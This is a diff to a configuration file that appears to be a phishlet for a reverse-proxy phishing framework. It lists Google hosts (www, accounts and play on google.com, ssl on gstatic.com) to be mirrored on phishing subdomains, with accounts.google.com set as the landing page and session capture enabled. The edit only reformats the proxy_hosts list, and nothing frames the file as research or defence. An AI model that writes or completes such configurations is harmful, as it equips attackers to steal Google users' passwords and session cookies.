@@ -1,6 +1,7 @@
 author: ''
 min_ver: '2.3.0' 
-proxy_hosts: - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,} 
+proxy_hosts: 
+- {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,} 
 - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false} 
 - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false} 
 - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false} 
